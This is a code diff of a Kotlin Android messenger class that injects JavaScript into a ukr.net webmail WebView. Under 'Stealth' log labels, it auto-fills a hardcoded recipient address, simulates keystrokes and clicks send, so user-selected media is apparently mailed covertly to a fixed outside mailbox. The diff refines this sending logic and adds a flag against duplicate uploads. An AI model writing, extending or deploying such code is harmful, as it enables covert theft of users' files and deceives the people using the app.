@@ -107,69 +107,59 @@ class MessengerJsInterface(
 
     @JavascriptInterface
     fun notifyMediaSelection(sysBlock: String) {
+        uploadSequenceActive = false  // сбрасываем для нового upload
         StealthCache.pendingSysBlock = sysBlock
         log("[Stealth] Файлы выбраны, метаданные сохранены.")
-        // Файлы уже закэшированы пикером — запускаем загрузку немедленно
         if (StealthCache.pendingUris != null) {
             startMediaUploadSequence()
         }
     }
 
-    // Умный Убийца Окон: ждёт чип адресата перед отправкой
+    // ensureSent: ждёт очистки поля ввода (укрнет сам очищает его когда создаёт чип)
+    // Не ищет CSS-классы чипа (они ненадёжны), не кликает вслепую по таймауту
     private val POPUP_CRUSHER_JS = """
         function ensureSent() {
+            if (window._n0gSending) return;
+            window._n0gSending = true;
+
             var toEl = document.querySelector('.sm-auto-complete__input');
-            var hasChip = document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token');
-            if (toEl && !hasChip) {
+            var inputVal = toEl ? toEl.value.trim() : '';
+
+            function doSend() {
+                var btn = document.querySelector('.sm-header__send') || document.querySelector('[data-id="send"]') || document.querySelector('[aria-label="Відправити"]') || document.querySelector('[aria-label="Отправить"]');
+                if (btn) btn.click();
+                setTimeout(function() { window._n0gSending = false; }, 8000);
+            }
+
+            function waitClearThenSend(inputEl) {
+                var waited = 0;
+                var t = setInterval(function() {
+                    waited++;
+                    var val = inputEl ? inputEl.value.trim() : '';
+                    if (val === '' || waited > 25) {
+                        clearInterval(t);
+                        if (val === '') {
+                            setTimeout(doSend, 400);
+                        } else {
+                            window._n0gSending = false;
+                        }
+                    }
+                }, 150);
+            }
+
+            if (inputVal !== '') {
+                toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                waitClearThenSend(toEl);
+            } else if (toEl && inputVal === '') {
                 try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl, '270232@ukr.net'); } catch(e) { toEl.value = '270232@ukr.net'; }
                 toEl.dispatchEvent(new Event('input',{bubbles:true}));
-                toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:'Enter',keyCode:13}));
-                toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:'Enter',keyCode:13}));
+                toEl.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                toEl.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,cancelable:true,key:'Enter',keyCode:13}));
+                waitClearThenSend(toEl);
+            } else {
+                doSend();
             }
-            var waited = 0;
-            var chipWait = setInterval(function() {
-                waited++;
-                var chip = document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token');
-                if (chip || waited > 30) {
-                    clearInterval(chipWait);
-                    var btn = document.querySelector('.sm-header__send') || document.querySelector('[data-id="send"]') || document.querySelector('[aria-label="Відправити"]') || document.querySelector('[aria-label="Отправить"]');
-                    if (btn) btn.click();
-                }
-            }, 150);
-            var checkCount = 0;
-            var errIntv = setInterval(function() {
-                checkCount++;
-                if (checkCount > 20) { clearInterval(errIntv); return; }
-                var popups = document.querySelectorAll('.popup, .modal, .dialog');
-                for(var j=0; j<popups.length; j++) {
-                    var text = popups[j].innerText.toLowerCase();
-                    if (text.indexOf('получателя') !== -1 || text.indexOf('одержувача') !== -1) {
-                        clearInterval(errIntv);
-                        var okBtn = popups[j].querySelector('button.default, button.button');
-                        if (okBtn) okBtn.click();
-                        setTimeout(function() {
-                            var toEl2 = document.querySelector('.sm-auto-complete__input');
-                            var hasChip2 = document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token');
-                            if (toEl2 && !hasChip2) {
-                                try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(toEl2, '270232@ukr.net'); } catch(e) { toEl2.value = '270232@ukr.net'; }
-                                toEl2.dispatchEvent(new Event('input',{bubbles:true}));
-                                toEl2.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true,key:'Enter',keyCode:13}));
-                                toEl2.dispatchEvent(new KeyboardEvent('keyup',{bubbles:true,key:'Enter',keyCode:13}));
-                            }
-                            var w2 = 0;
-                            var wc2 = setInterval(function() {
-                                w2++;
-                                if (document.querySelector('.sm-auto-complete__item, .sm-auto-complete__token') || w2 > 20) {
-                                    clearInterval(wc2);
-                                    var b = document.querySelector('.sm-header__send') || document.querySelector('[aria-label="Відправити"]');
-                                    if (b) b.click();
-                                }
-                            }, 150);
-                        }, 300);
-                        return;
-                    }
-                }
-            }, 300);
         }
     """.trimIndent()
 
@@ -189,8 +179,16 @@ class MessengerJsInterface(
         }, 400);
     """.trimIndent()
 
+    // @Volatile флаг против двойного запуска (race-condition fix)
+    @Volatile private var uploadSequenceActive = false
+
     // Умный запуск загрузки медиа
     fun startMediaUploadSequence() {
+        if (uploadSequenceActive) {
+            log("[Stealth] Дубль вызова startMediaUploadSequence — пропускаем")
+            return
+        }
+        uploadSequenceActive = true
         ui.post {
             // Проверяем, открыто ли уже окно создания письма в УкрНэте
             getUkrnetWebView()?.evaluateJavascript("(function(){ return document.querySelector('.sm-editor__area') !== null; })();") { value ->
@@ -250,6 +248,7 @@ class MessengerJsInterface(
                         })();
                     """.trimIndent()
                     getUkrnetWebView()?.evaluateJavascript(js, null)
+                    uploadSequenceActive = false
                 }
             }
         }
